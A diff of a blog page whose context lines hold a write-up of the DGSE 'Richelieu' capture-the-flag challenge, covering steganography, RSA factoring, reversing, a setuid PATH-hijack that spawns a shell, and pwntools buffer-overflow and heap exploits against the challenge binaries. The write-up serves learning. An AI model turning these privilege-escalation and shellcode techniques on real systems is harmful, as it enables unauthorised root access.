@@ -47,7 +47,7 @@
 <meta property="og:image:width" content="2048">
 <meta property="og:image:height" content="1024">
 
-<meta property="article:published_time" content="2019-06-14 14:55:32 &#43;0200 CEST" />
+<meta property="article:published_time" content="2019-06-14 14:55:32 &#43;0200 &#43;0200" />
 
 
 
@@ -203,7 +203,7 @@
 <p>We notice there is hidden text.</p>
 <p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077137/richelieu_challenge_writeup/jf3xanemrvnlrhnd02vr.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077137/richelieu_challenge_writeup/jf3xanemrvnlrhnd02vr.png" alt="img5"></a></p>
 <p>The hidden text is <code>base64</code>-encoded data, let&rsquo;s extract it, and decode it.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pdftotext Richelieu.pdf - | tail -n +9 | sed <span style="color:#0ff;font-weight:bold">&#34;s/[^a-zA-Z0-9\+\/=]//g&#34;</span> | base64 -d &gt;Richelieu_extracted
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pdftotext Richelieu.pdf - | tail -n +9 | sed <span style="color:#0ff;font-weight:bold">&#34;s/[^a-zA-Z0-9\+\/=]//g&#34;</span> | base64 -d &gt;Richelieu_extracted
 </code></pre></div><h2 id="span-id73aaa3df04a6aefa67ed6977ab3da72cthe-first-portraitspan"><span id='73aaa3df04a6aefa67ed6977ab3da72c'>The First Portrait</span></h2>
 <p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077159/richelieu_challenge_writeup/hboikeyqtbmirxempcdl.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077159/richelieu_challenge_writeup/hboikeyqtbmirxempcdl.png" alt="img6"></a></p>
 <p>We get a <code>jpeg</code> file, a portrait of Richelieu, which can be found <a href="https://drive.google.com/open?id=1dx1-o5rzAys15_fBLO8E9cqf5l2ruYdY">here</a>.</p>
@@ -211,7 +211,7 @@
 <p>We notice some uncommon things on that file while looking at it in a hex editor, we know that <code>jpeg</code> files end with the <code>EOI</code> marker <code>0xffd9</code> (<a href="https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure">reference</a>), and that file doesn&rsquo;t end with it, we find that marker somewhere inside the file, and after that marker, there is some appended data (the additional data is ignored by most image viewers).</p>
 <p>Let&rsquo;s extract the additional data, it starts with <code>PK</code> at offset <code>0x6ccbc</code>, I suspect it&rsquo;s an archive.</p>
 <p>(<code>rax2</code> is a base-converter, it&rsquo;s part of the <code>radare2</code> framework).</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dd <span style="color:#fff;font-weight:bold">if</span>=Richelieu_extracted of=appended_data ibs=<span style="color:#ff0;font-weight:bold">1</span> skip=<span style="color:#fff;font-weight:bold">$(</span>rax2 0x6ccbc<span style="color:#fff;font-weight:bold">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dd <span style="color:#fff;font-weight:bold">if</span>=Richelieu_extracted of=appended_data ibs=<span style="color:#ff0;font-weight:bold">1</span> skip=<span style="color:#fff;font-weight:bold">$(</span>rax2 0x6ccbc<span style="color:#fff;font-weight:bold">)</span>
 </code></pre></div><p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077283/richelieu_challenge_writeup/szgirint8suizk6hsgbm.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077283/richelieu_challenge_writeup/szgirint8suizk6hsgbm.png" alt="img8"></a></p>
 <p>It&rsquo;s a password-protected zip archive (you can download it <a href="https://drive.google.com/file/d/1GPq5ZYDY_EHJno56YOMdUhxZ9gAXWb8l/view?usp=sharing">here</a>), we can list its content with <code>unzip -l</code>.</p>
 <p>We find its password: <code>DGSE{t.D=@Bx^A%n9FQB~_VL7Zn8z=:K^4ikE=j0EGHqI}</code></p>
@@ -228,7 +228,7 @@
 </ul>
 <p>Our goal is first to attack the RSA encryption, if we can factorize the modulus <code>N</code>, we will be able to decrypt <code>motDePasseGPG.txt.enc</code>, and because we have some informations about one prime, that&rsquo;s feasible.
 Because of the substitution, we don&rsquo;t know exactly for example if <code>0xfb</code> in the <code>prime.txt</code> file was also <code>0xfb</code> in the prime, or if it was <code>0x7f</code> and was substituted in the file, but because only 6 fixed byte substitutions occured, we can bruteforce all the possible primes, and get the one that divides <code>N</code>, let&rsquo;s first retrieve <code>N</code>.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">openssl asn1parse -inform pem -in public.key -strparse <span style="color:#ff0;font-weight:bold">19</span>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">openssl asn1parse -inform pem -in public.key -strparse <span style="color:#ff0;font-weight:bold">19</span>
 </code></pre></div><p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125994/richelieu_challenge_writeup/zkxyhwf37azg5mdwmone.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560125994/richelieu_challenge_writeup/zkxyhwf37azg5mdwmone.png" alt="img10"></a></p>
 <p>These parameters are <code>N</code> (the modulus) and <code>e</code> (the public exponent).</p>
 <p>Once we find that prime <code>p</code> that divides <code>N</code>, let <code>q = N / p</code>, it&rsquo;s straightforward, we could calculate the parameters of the private key, and save them in the <code>PEM</code> format, and then decrypt the file using the private key generated, or we could just decrypt using the RSA formula, here is how decryption works:</p>
@@ -237,7 +237,7 @@ Because of the substitution, we don&rsquo;t know exactly for example if <code>0x
 <li>Calculate the private exponent <code>d = (1/e) mod phi(N)</code></li>
 <li>Decrypt the encrypted data <code>c</code> by computing <code>c ** d (mod N)</code>, and remove the padding (I will not do it in my implementation).</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#fff;font-weight:bold">require</span><span style="color:#0ff;font-weight:bold">&#39;colorize&#39;</span>; <span style="color:#007f7f"># for colorizing output</span>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#fff;font-weight:bold">require</span><span style="color:#0ff;font-weight:bold">&#39;colorize&#39;</span>; <span style="color:#007f7f"># for colorizing output</span>
 N = <span style="color:#ff0;font-weight:bold">0xCD5F8A24C7605008897A3C922C0E812E769DE0A46442C350CB78C7868539F3D38AAC80B3E6A506605910E8599806B4D1D148F2F6B81DA04796A8A5AEE18F29E83E16775A2A0A00870541F6574ED1438636AE0A0C116E07104F48F72094863A3869E1C8FC220627278962FB22873E3156F18E55DEC94E970064EC7F4E0E88454012E2FD5DFE5F8D19BF170F9CCB3F46E0FD1019BCB02D9083A0703C617F996379E6478354A73AE6E6ACBCE1F4333ECFAF24366A3E977D3CD3CBFE8D8A387BD876BFDAB8488F6F47BF1FBE33010FD2D7E22B4DB2E567783CE0B606DB86B93759714C4F6396A7FB9F74C4021043B0F3D46D2633EBD43A877863DF7D680F506587C119DD64100CA831CE2AF33D951B524C5F06B49F5BF2CB381E74181930D06A80505C06ABD5BF4870F0C9FB581BD80DBA889660639F936EDEA8FE5D0C9EAE58062ED693252583C71CC782BA613E01438E69B43F9E64ECA84F9EA04E811AD7B39EFD7876D1B6B501C4F48ACCE6F24239F6C04028788135CD88C3D15BE0F2EBB7DE9E9C19A7A93037005EE0A9A640BADA332EC0D05EE9F08A832354A0487A927D5E88066E2569E6C5D4688E422BFA0B27C6171C6D7BF029BFD9165752AF19AA71B33A1EA70B6C371FB21E47F527D80B7D04F582AD9F9935AF723682DC01CA9880621870DECB7AD15648CDF4EF153016F3E6D87933B8EC54CFA1FDF87C467020A3E753</span>;
 e = <span style="color:#ff0;font-weight:bold">0x10001</span>;
 prime1 = File.read(<span style="color:#0ff;font-weight:bold">&#39;prime.txt&#39;</span>).lines;
@@ -294,14 +294,14 @@ File.open(<span style="color:#0ff;font-weight:bold">&#39;motDePasseGPG.txt.enc&#
 </code></pre></div><p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077523/richelieu_challenge_writeup/uwrpa1lpnwuusblre5ql.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077523/richelieu_challenge_writeup/uwrpa1lpnwuusblre5ql.png" alt="img11"></a></p>
 <p>The content of <code>motDePasseGPG.txt</code> was <code>DGSE{Ti,%yei3=stlh_,5@pIrrMU.^mJC:luYbt1Qe_-Y}</code>, anything before the <code>\x00</code>, including it is padding.</p>
 <p>Lets decrypt <code>lsb_RGB.png.enc</code> symmetrically using that flag as the passphrase.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gpg --decrypt lsb_RGB.png.enc &gt; lsb_RGB.png
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gpg --decrypt lsb_RGB.png.enc &gt; lsb_RGB.png
 </code></pre></div><h2 id="span-ideefd0c86d4089a816d31551a02bfd966the-second-portraitspan"><span id='eefd0c86d4089a816d31551a02bfd966'>The Second portrait</span></h2>
 <p>The file <code>lsb_RGB.png</code> can be found <a href="https://drive.google.com/file/d/1OdJs1e4ApsuE5pdM0jrPahqr4gmbGUvC/view?usp=sharing">here</a>.</p>
 <p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077562/richelieu_challenge_writeup/dswbpjkzwbt9ldzxjtbq.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077562/richelieu_challenge_writeup/dswbpjkzwbt9ldzxjtbq.png" alt="img12"></a></p>
 <p>Richelieu again :), this time, the filename <code>lsb_RGB</code> is a big hint towards LSB Steganography.</p>
 <p>LSB stands for Least Significant Bit, the technique works by replacing the least significant bit of pixel values with the bits of the secret message, it goes unnoticed because when you replace the lowest bit of a value, it changes by 0 or 1, the pixel color is still the same to a viewer&rsquo;s eye, the technique can be used on a color channel, or on all the colors.</p>
 <p>After trying a few things, we get the secret message using the following Python script, for each pixel, we concatenate the least significant bit of the <code>R</code>,<code>G</code>,<code>B</code> coordinates in this order.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> PIL <span style="color:#fff;font-weight:bold">import</span> Image
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> PIL <span style="color:#fff;font-weight:bold">import</span> Image
 
 <span style="color:#fff;font-weight:bold">def</span> get_pixels(image):
 	w,h = image.size
@@ -326,7 +326,7 @@ byte_index = <span style="color:#ff0;font-weight:bold">0</span>
 <span style="color:#fff;font-weight:bold">print</span>( extracted_data )
 </code></pre></div><p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077639/richelieu_challenge_writeup/awaavonkn9a0qo9f18wk.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077639/richelieu_challenge_writeup/awaavonkn9a0qo9f18wk.png" alt="img13"></a></p>
 <p>We get the hexdump of an <code>ELF</code> file (Executable and Linkable Format), that&rsquo;s the output of the <code>xxd</code> command, we can get the original <code>ELF</code> file by using the <code>-r</code> option of <code>xxd</code>.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 lsb_steg.py |grep -P --binary-files=text <span style="color:#0ff;font-weight:bold">&#34;^[0-9a-f]{8}:&#34;</span> | xxd -r &gt; elf_file
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 lsb_steg.py |grep -P --binary-files=text <span style="color:#0ff;font-weight:bold">&#34;^[0-9a-f]{8}:&#34;</span> | xxd -r &gt; elf_file
 </code></pre></div><h2 id="span-id0bb98124495bb80830a7cab5ba6b015freverse-engineeringspan"><span id='0bb98124495bb80830a7cab5ba6b015f'>Reverse Engineering</span></h2>
 <p>You can download the elf file <a href="https://drive.google.com/file/d/11qvXGbV7D0Jn0p8A1gbXujdF2hrZ1wcO/view?usp=sharing">here</a>.</p>
 <p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077687/richelieu_challenge_writeup/achmket1adxvuo1elcua.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077687/richelieu_challenge_writeup/achmket1adxvuo1elcua.png" alt="img14"></a></p>
@@ -350,7 +350,7 @@ byte_index = <span style="color:#ff0;font-weight:bold">0</span>
 <li>for each index <code>i</code> in the range <code>[1 .. 29]</code>, the code is checking if <code>buffer[i] ^ input[i] == buffer[i+1]</code>.</li>
 </ul>
 <p>The following script retrieves the serial.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">buffer = <span style="color:#0ff;font-weight:bold">%w(33 77 30 63 26 5d 3a 0e 3b 0d 4d 2a 1f 2e 1f 2d 4f 28 51 37 7a 14 76 20 78 0f 21 4d 21 6c 11 00)</span>;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">buffer = <span style="color:#0ff;font-weight:bold">%w(33 77 30 63 26 5d 3a 0e 3b 0d 4d 2a 1f 2e 1f 2d 4f 28 51 37 7a 14 76 20 78 0f 21 4d 21 6c 11 00)</span>;
 buffer.map!{|e| e.to_i(<span style="color:#ff0;font-weight:bold">16</span>)}; <span style="color:#007f7f"># convert buffer to an array of integers</span>
 <span style="color:#fff;font-weight:bold">p</span> <span style="color:#ff0;font-weight:bold">30</span>.times.map{|i| (buffer[i]^buffer[i+<span style="color:#ff0;font-weight:bold">1</span>]).chr}.join
 </code></pre></div><p><code>DGSE{g456@g5112bgyfMnbVXw.llM}</code></p>
@@ -364,7 +364,7 @@ buffer.map!{|e| e.to_i(<span style="color:#ff0;font-weight:bold">16</span>)}; <s
 <p>The <code>setuid</code> binary provided can be found <a href="https://drive.google.com/file/d/1JSinC1dOEY4HXSH2jPVkyssHb6sHuwy5/view?usp=sharing">here</a>.</p>
 <p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077985/richelieu_challenge_writeup/ejehw8f10pion1hh4vre.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560077985/richelieu_challenge_writeup/ejehw8f10pion1hh4vre.png" alt="img20"></a></p>
 <p>We reverse-engineer the executable <code>prog.bin</code>, and we find out that it&rsquo;s doing very simple things, here it is in pseudocode.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#007f7f">// int choice is read from the user with scanf(&#34;%d&#34;, &amp;choice);
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#007f7f">// int choice is read from the user with scanf(&#34;%d&#34;, &amp;choice);
 </span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">if</span> (choice == <span style="color:#ff0;font-weight:bold">1</span>)
 	system(<span style="color:#0ff;font-weight:bold">&#34;date &#39;+Nous sommes le %d/%m/%Y et il est %H:%M:%S&#39;&#34;</span>);
 <span style="color:#fff;font-weight:bold">else</span> if (choice == <span style="color:#ff0;font-weight:bold">2</span>)
@@ -376,14 +376,14 @@ buffer.map!{|e| e.to_i(<span style="color:#ff0;font-weight:bold">16</span>)}; <s
 <span style="color:#fff;font-weight:bold">else</span>
 	puts(<span style="color:#0ff;font-weight:bold">&#34;Mauvais choix :-/&#34;</span>);
 </code></pre></div><p>The vulnerability is easy to spot, we notice that the setuid executable is running commands with relative paths, the following exploit should spawn a shell when we enter <code>4</code>:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir /tmp/workdir &amp;&amp; cp /bin/sh /tmp/workdir/cal &amp;&amp; (PATH=/tmp/workdir:$PATH ./prog.bin)
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir /tmp/workdir &amp;&amp; cp /bin/sh /tmp/workdir/cal &amp;&amp; (PATH=/tmp/workdir:$PATH ./prog.bin)
 </code></pre></div><p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126261/richelieu_challenge_writeup/djcdzax6ymlyljwlve5v.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126261/richelieu_challenge_writeup/djcdzax6ymlyljwlve5v.png" alt="img21"></a></p>
 <p>This works because relative paths are looked at from the <code>$PATH</code> environment variable, <code>cal</code> is resolved to <code>/tmp/workdir/cal</code>, which spawns a shell.</p>
 <h2 id="span-id552c2c2154e968fa737a77cc61b93a9cbuffer-overflow-like-in-1999span"><span id='552c2c2154e968fa737a77cc61b93a9c'>Buffer overflow like in 1999</span></h2>
 <p>Another <code>setuid</code> binary (which you can download <a href="https://drive.google.com/file/d/17mLfv7tKFf7SoWDnOlpkOAObBzEtfA1Z/view?usp=sharing">here</a>), this time, it prompts for a username and a password.</p>
 <p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126407/richelieu_challenge_writeup/vhrpbuat2a9vmcftaehr.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1560126407/richelieu_challenge_writeup/vhrpbuat2a9vmcftaehr.png" alt="img22"></a></p>
 <p>We get the following pseudocode from IDA Pro:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#fff;font-weight:bold">char</span> *<span style="color:#fff;font-weight:bold">__fastcall</span> sub_40086D(<span style="color:#fff;font-weight:bold">char</span> *a1)
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#fff;font-weight:bold">char</span> *<span style="color:#fff;font-weight:bold">__fastcall</span> sub_40086D(<span style="color:#fff;font-weight:bold">char</span> *a1)
 {
   <span style="color:#fff;font-weight:bold">char</span> *result; <span style="color:#007f7f">// rax
 </span><span style="color:#007f7f"></span>  <span style="color:#fff;font-weight:bold">char</span> v2; <span style="color:#007f7f">// [rsp+10h] [rbp-30h]
@@ -423,7 +423,7 @@ buffer.map!{|e| e.to_i(<span style="color:#ff0;font-weight:bold">16</span>)}; <s
 </ul>
 <p>If none of these holds, <code>1</code> is returned, otherwise, <code>0</code> is returned.</p>
 <p>Since our <code>password</code>, after overwriting <code>rip</code>, will overwrite our <code>login</code>, the <code>login</code> read by the program does not have a lot of use, for the shellcode, we will generate one that executes <code>/bin/sh</code>, and prepend it with <code>sub rsp, 0x200</code> because using the stack without doing that might corrupt our shellcode, stack operations will affect our instructions.</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
 p = process(<span style="color:#0ff;font-weight:bold">&#39;/home/defi2/prog.bin&#39;</span>)
 jmp_rax = <span style="color:#ff0;font-weight:bold">0x400605</span>
 buf =  <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\x48\x81\xec\x00\x02\x00\x00</span><span style="color:#0ff;font-weight:bold">&#34;</span> <span style="color:#007f7f"># sub rsp, 0x200</span>
@@ -442,7 +442,7 @@ p.interactive()
 <ul>
 <li>Structures, and initialized variables :</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">struct</span> account {
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">struct</span> account {
 		<span style="color:#fff;font-weight:bold">char</span>* nom;
 		<span style="color:#fff;font-weight:bold">char</span>* id;
 	};
@@ -455,7 +455,7 @@ p.interactive()
 </code></pre></div><ul>
 <li>Create an element :</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">struct</span> account* elem = malloc(<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> account)); <span style="color:#007f7f">// malloc(16)
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">struct</span> account* elem = malloc(<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> account)); <span style="color:#007f7f">// malloc(16)
 </span><span style="color:#007f7f"></span>	<span style="color:#fff;font-weight:bold">char</span> s[<span style="color:#ff0;font-weight:bold">1280</span>];
 	fgets(s, <span style="color:#ff0;font-weight:bold">1280</span>, stdin);
 	elem-&gt;nom = malloc(strlen(s)+<span style="color:#ff0;font-weight:bold">1</span>); <span style="color:#007f7f">// malloc(user_specified)
@@ -466,7 +466,7 @@ p.interactive()
 </code></pre></div><ul>
 <li>Display all the elements :</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">for</span> ( <span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; accounts_count; i++)
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">for</span> ( <span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; accounts_count; i++)
 	{
 		printf(<span style="color:#0ff;font-weight:bold">&#34;  element[%d] -&gt; nom : %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, accounts[i]-&gt;nom);
 		printf(<span style="color:#0ff;font-weight:bold">&#34;  element[%d] -&gt; id : %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, accounts[i]-&gt;id);
@@ -474,7 +474,7 @@ p.interactive()
 </code></pre></div><ul>
 <li>Destroy element :</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">int</span> elem_ind = read_int();
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">int</span> elem_ind = read_int();
 	<span style="color:#fff;font-weight:bold">if</span> (elem_ind &gt;= <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; elem_ind &lt; accounts_count)
 	{
 		puts(<span style="color:#0ff;font-weight:bold">&#34;destroy id : 1 , destroy name : 2&#34;</span>);
@@ -487,7 +487,7 @@ p.interactive()
 </code></pre></div><ul>
 <li>Change <code>name</code> :</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">char</span> s[<span style="color:#ff0;font-weight:bold">1284</span>];
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">char</span> s[<span style="color:#ff0;font-weight:bold">1284</span>];
 	<span style="color:#fff;font-weight:bold">int</span> elem_ind = read_int();
 	<span style="color:#fff;font-weight:bold">if</span> (elem_ind &gt;= <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; elem_ind &lt; accounts_count)
 	{
@@ -498,7 +498,7 @@ p.interactive()
 </code></pre></div><ul>
 <li>Change <code>id</code> :</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">int</span> elem_ind = read_int();
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">	<span style="color:#fff;font-weight:bold">int</span> elem_ind = read_int();
 	<span style="color:#fff;font-weight:bold">if</span> (elem_ind &gt;= <span style="color:#ff0;font-weight:bold">0</span> &amp;&amp; elem_ind &lt; accounts_count)
 	{
 		fgets(s, var+<span style="color:#ff0;font-weight:bold">2</span>, stdin);
@@ -518,7 +518,7 @@ p.interactive()
 <li>Create an element having any <code>name</code> (xyz) and any <code>id</code> (index=1)</li>
 </ul>
 <p>This will trigger:</p>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#fff;font-weight:bold">struct</span> element* a=malloc(<span style="color:#ff0;font-weight:bold">16</span>)
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#fff;font-weight:bold">struct</span> element* a=malloc(<span style="color:#ff0;font-weight:bold">16</span>)
 b = malloc(<span style="color:#ff0;font-weight:bold">16</span>)
 c = malloc(<span style="color:#ff0;font-weight:bold">51</span>)
 free(b)
@@ -538,7 +538,7 @@ f = malloc(<span style="color:#ff0;font-weight:bold">51</span>)
 <li>Edit the <code>name</code> of the element at index 1 with the address of <code>system</code>.</li>
 <li>Edit the <code>id</code> of the element at index 0, this should trigger a call to <code>strcpy</code>, which will land on <code>system</code>, and the first argument (<code>dest</code>) has the previous id of the element at index 0 (which we control).</li>
 </ul>
-<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
 <span style="color:#fff;font-weight:bold">import</span> re
 
 p = process(<span style="color:#0ff;font-weight:bold">&#39;/home/defi3/prog.bin&#39;</span>)
@@ -656,7 +656,7 @@ p.interactive()
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
         <span>:: Proudly hosted on Github</span>
       </div>
     
